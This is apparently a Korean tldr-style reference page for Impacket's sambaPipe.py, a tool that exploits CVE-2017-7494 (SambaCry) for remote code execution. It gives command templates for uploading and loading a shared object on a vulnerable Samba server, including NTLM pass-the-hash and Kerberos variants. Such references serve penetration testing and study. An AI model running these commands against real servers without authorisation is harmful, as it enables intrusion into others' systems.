# sambaPipe.py

> CVE-2017-7494 (SambaCry)를 악용하여 취약한 Samba 서버에 공유 객체(SO) 파일을 업로드하고 로드함으로써, 원격 코드 실행을 수행.
> Impacket 도구의 일부.
> 더 많은 정보: <https://github.com/fortra/impacket>.

- 취약한 Samba 서버에 공유 객체 파일 업로드 및 로드:

`sambaPipe.py -so {{경로/대상/파일.so}} {{도메인}}/{{사용자명}}:{{비밀번호}}@{{대상}}`

- 비밀번호 대신 NTLM 해시를 사용하여 인증:

`sambaPipe.py -so {{경로/대상/파일.so}} -hashes {{LM_HASH:NT_HASH}} {{도메인}}/{{사용자명}}:{{비밀번호}}@{{대상}}`

- 대상에 Kerberos 인증 사용:

`sambaPipe.py -so {{경로/대상/파일.so}} -k -no-pass {{도메인}}/{{사용자명}}:{{비밀번호}}@{{대상}}`

- 인증에 사용할 도메인 컨트롤러 IP 지정:

`sambaPipe.py -so {{경로/대상/파일.so}} -dc-ip {{dc_아이피}} {{도메인}}/{{사용자명}}:{{비밀번호}}@{{대상}}`

- SMB 연결에 사용자 지정 포트 사용:

`sambaPipe.py -so {{경로/대상/파일.so}} -port {{포트}} {{도메인}}/{{사용자명}}:{{비밀번호}}@{{대상}}`
